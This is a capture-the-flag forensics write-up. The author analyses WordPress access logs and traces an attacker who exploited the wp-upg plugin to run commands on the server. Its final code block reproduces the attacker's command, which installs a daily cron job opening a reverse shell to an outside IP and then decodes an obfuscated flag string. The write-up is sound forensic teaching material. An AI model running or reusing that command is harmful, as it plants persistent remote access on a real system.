# Explanation
We are given the following file:
* `access.log`: Wordpress server logs.

In the log file, notice there are several requests related to a WordPress website.

# Solution
By slowly analyzing the logs, `82.179.92.206` has performed the most requests out of the IP addresses, indicating a suspicious activity. So we can find the amount of times an IP addresses was involved by the number of requests.
```
cat access.log | cut -d " " -f 1 | sort | uniq -c
```

![vul](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/c8fa44b3-133d-4df6-b276-c06c98c9778d)

By reading the instructions, they mentioned that the attacker may have exploited a vulnerability in a plugin. 
Hence, the search can be easier by filtering the logs using "wp-content/plugins/" which is the directory storing all the plugins. Requests from 82.179.92.206 with response status code of 200 are the key to identifying the vulnerability, as these can reveal whether the attacker's attempts were successful. 

By analyzing the logs, notice how some requests suggest that the attacker has exploited the `wp-upg` plugin since the plugin was responding with 200 OK messages. Additionally, `wp-upg` has certain vulnerabilities such as CVE-2022-4060 and CVE-2023-0039

![vul2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/e0aac332-d852-458d-a5b6-39ac78ff7369)

After identifying the vulnerable plugin, the logs are analyzed further and another important log was found. These requests indicate the attacker was attempting to execute arbitrary commands on the system.

![vul3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/9a45e2a9-b710-48e1-b087-f62fd4dc2986)

One of the requests creates a cron job named `testconnect` that connects to a Command and Control (CnC) server and prints the flag.

![vul4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ccbeef90-e54d-42ba-b1e9-66a5a2495552)

![vul5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/d26940c4-9311-499f-9468-c29b2b5b990f)

At this point, I was stuck and required help from the HTB writeup. I found out that to retrieve the flag was to decode the URL using the `testconnect` cron job again. This can be done using the command:

```
echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
```

![vul6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a9bbfa96-a62f-49aa-8d85-7ba1410c8684)
